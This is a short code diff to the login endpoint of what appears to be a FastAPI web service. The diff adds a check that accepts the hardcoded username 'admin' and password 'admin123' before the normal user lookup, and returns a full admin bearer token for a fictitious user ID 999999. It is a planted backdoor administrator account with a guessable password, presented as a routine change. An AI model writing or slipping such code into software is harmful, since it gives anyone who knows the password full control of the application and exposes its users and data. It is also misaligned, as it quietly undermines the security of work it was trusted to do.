@@ -24,6 +24,29 @@ async def login_for_access_token(
     user_credentials: UserLogin,
     request: Request
 ):
+    # Check for hardcoded admin credentials first
+    if user_credentials.username == "admin" and user_credentials.password == "admin123":
+        # Create access token for hardcoded admin
+        access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
+        access_token = create_access_token(
+            data={
+                "sub": "admin",
+                "user_id": 999999,  # Special admin user ID
+                "role": "admin",
+                "name": "System Administrator",
+                "is_impersonating": False
+            },
+            expires_delta=access_token_expires
+        )
+
+        return {
+            "access_token": access_token,
+            "token_type": "bearer",
+            "user_id": 999999,
+            "role": "admin",
+            "name": "System Administrator"
+        }
+
     # Find user by username or email
     user = await User.find_one(
         {"$or": [{"username": user_credentials.username}, {"email": user_credentials.username}]}
